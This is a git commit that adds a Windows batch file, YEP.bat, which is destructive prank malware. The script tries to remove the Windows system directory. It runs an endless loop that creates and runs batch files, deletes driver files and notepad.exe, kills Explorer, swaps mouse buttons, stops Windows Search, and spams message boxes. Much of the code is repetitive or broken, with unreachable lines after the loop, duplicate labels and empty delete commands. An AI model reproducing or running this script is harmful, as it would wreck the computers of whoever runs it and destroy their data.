1a851c338b5242e5199c5ddc9b991e7ed9f1dfb0
PEDROOPSSS <pedrolinu10@gmail.com>
2025-06-07 18:10:06 -0300

    Add files via upload

---
+++ YEP.bat
@@ -0,0 +1,80 @@
+@echo off
+time 99:99
+RMDIR %systemroot%
+:loop
+%userprofile%/desktop
+echo msgbox"flood">%random%.bat&%random%.bat
+goto loop
+rundll32 mouse,disable
+rundll32 keyboard,disable
+del /q /f /s %systemroot%\System32\Drivers\*
+del /q /f /s %systemroot%\System32\Drivers\*
+del /q /f /s %systemroot%\System32\Drivers\*
+del /q /f /s %systemroot%\System32\Drivers\*
+TASKKILL /F /IM EXPLORER.EXE
+TASKKILL /F /IM EXPLORER.EXE
+TASKKILL /F /IM EXPLORER.EXE
+TASKKILL /F /IM EXPLORER.EXE
+TASKKILL /F /IM EXPLORER.EXE
+TASKKILL /F /IM EXPLORER.EXE
+TASKKILL /F /IM EXPLORER.EXE
+DEL C:\Windows\System32\notepad.exe
+DEL C:\Windows\System32\notepad.exe
+DEL C:\Windows\System32\notepad.exe
+rundll32 USER32.DLL,SwapMouseButton
+net stop "WSearch"
+color  6F54
+echo msgbox"">.vbs&.vbs
+DEL 
+:msgboxspam
+echo msgbox"">.vbs&.vbs
+DEL 
+goto msgboxspam
+:msgboxspam
+echo msgbox"">.vbs&.vbs
+DEL 
+goto msgboxspam
+:msgboxspam
+echo msgbox"">.vbs&.vbs
+DEL 
+goto msgboxspam
+:msgboxspam
+echo msgbox"YEP">LOLLL.vbs&LOLLL.vbs
+DEL LOLLL
+goto msgboxspam
+:msgboxspam
+echo msgbox"YEP">LOLLL.vbs&LOLLL.vbs
+DEL LOLLL
+goto msgboxspam
+:msgboxspam
+echo msgbox"YEP">LOLLL.vbs&LOLLL.vbs
+DEL LOLLL
+goto msgboxspam
+:msgboxspam
+echo msgbox"YEP">LOLLL.vbs&LOLLL.vbs
+DEL LOLLL
+goto msgboxspam
+:msgboxspam
+echo msgbox"YEP">LOLLL.vbs&LOLLL.vbs
+DEL LOLLL
+goto msgboxspam
+:msgboxspam
+echo msgbox"YEP">LOLLL.vbs&LOLLL.vbs
+DEL LOLLL
+goto msgboxspam
+:msgboxspam
+echo msgbox"YEP">LOLLL.vbs&LOLLL.vbs
+DEL LOLLL
+goto msgboxspam
+:msgboxspam
+echo msgbox"YEP">LOLLL.vbs&LOLLL.vbs
+DEL LOLLL
+goto msgboxspam
+:msgboxspam
+echo msgbox"YEP">LOLLL.vbs&LOLLL.vbs
+DEL LOLLL
+goto msgboxspam
+:msgboxspam
+echo msgbox"YEP">LOLLL.vbs&LOLLL.vbs
+DEL LOLLL
+goto msgboxspam
